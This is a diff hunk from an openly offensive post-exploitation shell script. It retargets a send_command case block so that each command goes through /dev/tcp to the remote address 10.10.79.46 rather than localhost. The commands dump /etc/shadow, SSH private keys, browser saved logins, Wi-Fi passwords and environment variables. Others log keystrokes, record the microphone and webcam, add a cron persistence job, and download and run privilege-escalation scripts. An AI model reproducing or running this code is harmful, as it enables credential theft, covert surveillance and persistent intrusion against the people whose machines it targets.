@@ -1941,31 +1941,31 @@ post_exploitation() {
 send_command() {
     local cmd="$1"
     case $cmd in
-        gather_system_info_linux) echo "uname -a && lsb_release -a" > /dev/tcp/localhost/$listen_port ;;
-        enumerate_users_groups_linux) echo "cat /etc/passwd && cat /etc/group" > /dev/tcp/localhost/$listen_port ;;
-        check_sudo_permissions_linux) echo "sudo -l" > /dev/tcp/localhost/$listen_port ;;
-        search_sensitive_files_linux) echo "find / -type f -name '*password*'" > /dev/tcp/localhost/$listen_port ;;
-        network_information_linux) echo "ifconfig && netstat -an" > /dev/tcp/localhost/$listen_port ;;
-        privilege_escalation_scripts_linux) echo "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" > /dev/tcp/localhost/$listen_port ;;
-        persistence_methods_linux) echo "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" > /dev/tcp/localhost/$listen_port ;;
-        extract_password_hashes_linux) echo "cat /etc/shadow" > /dev/tcp/localhost/$listen_port ;;
-        keylogging_linux) echo "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" > /dev/tcp/localhost/$listen_port ;;
-        exploit_suggester_linux) echo "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" > /dev/tcp/localhost/$listen_port ;;
-        list_scheduled_tasks_linux) echo "crontab -l && ls -al /etc/cron* && systemctl list-timers" > /dev/tcp/localhost/$listen_port ;;
-        list_installed_software_linux) echo "dpkg -l || rpm -qa" > /dev/tcp/localhost/$listen_port ;;
-        collect_browser_data_linux) echo "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" > /dev/tcp/localhost/$listen_port ;;
-        dump_ssh_keys_linux) echo "cat ~/.ssh/id_rsa" > /dev/tcp/localhost/$listen_port ;;
-        capture_screenshots_linux) echo "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" > /dev/tcp/localhost/$listen_port ;;
-        monitor_network_traffic_linux) echo "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" > /dev/tcp/localhost/$listen_port ;;
-        collect_wifi_passwords_linux) echo "grep -r '^psk=' /etc/NetworkManager/system-connections/" > /dev/tcp/localhost/$listen_port ;;
-        list_running_processes_linux) echo "ps aux" > /dev/tcp/localhost/$listen_port ;;
-        record_microphone_linux) echo "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" > /dev/tcp/localhost/$listen_port ;;
-        webcam_capture_linux) echo "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" > /dev/tcp/localhost/$listen_port ;;
+        gather_system_info_linux) echo "uname -a && lsb_release -a" > /dev/tcp/10.10.79.46/$listen_port ;;
+        enumerate_users_groups_linux) echo "cat /etc/passwd && cat /etc/group" > /dev/tcp/10.10.79.46/$listen_port ;;
+        check_sudo_permissions_linux) echo "sudo -l" > /dev/tcp/10.10.79.46/$listen_port ;;
+        search_sensitive_files_linux) echo "find / -type f -name '*password*'" > /dev/tcp/10.10.79.46/$listen_port ;;
+        network_information_linux) echo "ifconfig && netstat -an" > /dev/tcp/10.10.79.46/$listen_port ;;
+        privilege_escalation_scripts_linux) echo "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" > /dev/tcp/10.10.79.46/$listen_port ;;
+        persistence_methods_linux) echo "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" > /dev/tcp/10.10.79.46/$listen_port ;;
+        extract_password_hashes_linux) echo "cat /etc/shadow" > /dev/tcp/10.10.79.46/$listen_port ;;
+        keylogging_linux) echo "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" > /dev/tcp/10.10.79.46/$listen_port ;;
+        exploit_suggester_linux) echo "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" > /dev/tcp/10.10.79.46/$listen_port ;;
+        list_scheduled_tasks_linux) echo "crontab -l && ls -al /etc/cron* && systemctl list-timers" > /dev/tcp/10.10.79.46/$listen_port ;;
+        list_installed_software_linux) echo "dpkg -l || rpm -qa" > /dev/tcp/10.10.79.46/$listen_port ;;
+        collect_browser_data_linux) echo "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" > /dev/tcp/10.10.79.46/$listen_port ;;
+        dump_ssh_keys_linux) echo "cat ~/.ssh/id_rsa" > /dev/tcp/10.10.79.46/$listen_port ;;
+        capture_screenshots_linux) echo "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" > /dev/tcp/10.10.79.46/$listen_port ;;
+        monitor_network_traffic_linux) echo "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" > /dev/tcp/10.10.79.46/$listen_port ;;
+        collect_wifi_passwords_linux) echo "grep -r '^psk=' /etc/NetworkManager/system-connections/" > /dev/tcp/10.10.79.46/$listen_port ;;
+        list_running_processes_linux) echo "ps aux" > /dev/tcp/10.10.79.46/$listen_port ;;
+        record_microphone_linux) echo "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" > /dev/tcp/10.10.79.46/$listen_port ;;
+        webcam_capture_linux) echo "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" > /dev/tcp/10.10.79.46/$listen_port ;;
         check_virtual_machines_linux) echo "dmesg | grep -i virtual && lscpu | grep Hypervisor" > /dev/tcp/localhost/$listen_port ;;
-        extract_ssh_config_linux) echo "cat /etc/ssh/sshd_config" > /dev/tcp/localhost/$listen_port ;;
-        extract_environment_variables_linux) echo "printenv" > /dev/tcp/localhost/$listen_port ;;
-        list_open_files_linux) echo "lsof" > /dev/tcp/localhost/$listen_port ;;
-        enumerate_installed_services_linux) echo "systemctl list-units --type=service" > /dev/tcp/localhost/$listen_port ;;
+        extract_ssh_config_linux) echo "cat /etc/ssh/sshd_config" > /dev/tcp/10.10.79.46/$listen_port ;;
+        extract_environment_variables_linux) echo "printenv" > /dev/tcp/10.10.79.46/$listen_port ;;
+        list_open_files_linux) echo "lsof" > /dev/tcp/10.10.79.46/$listen_port ;;
+        enumerate_installed_services_linux) echo "systemctl list-units --type=service" > /dev/tcp/10.10.79.46/$listen_port ;;
     esac
 }
 
